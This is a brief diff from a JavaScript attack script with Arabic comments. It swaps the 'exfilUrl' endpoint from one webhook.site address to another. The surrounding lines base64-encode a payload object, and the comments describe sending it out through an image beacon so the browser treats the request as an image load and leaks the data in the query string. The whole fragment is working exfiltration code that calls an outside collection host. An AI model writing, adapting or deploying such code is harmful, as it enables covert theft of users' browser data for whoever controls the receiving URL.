@@ -22,7 +22,7 @@ const payload = {
 const encodedData = btoa(JSON.stringify(payload));
 
 // 5. رابط الاستقبال (استبدل هذا برابط Webhook.site الخاص بك)
-const exfilUrl = "https://webhook.site/26e1b70c-6086-498e-9474-e473df7babfd"; 
+const exfilUrl = "https://webhook.site/e70d0bfd-516b-48cd-95ef-aa55257ccf61"; 
 
 // 6. الإرسال عبر Image Beacon (الطريقة الأضمن)
 // المتصفح سيعتبر هذا طلب صورة وسيرسل البيانات في الرابط (Query String)
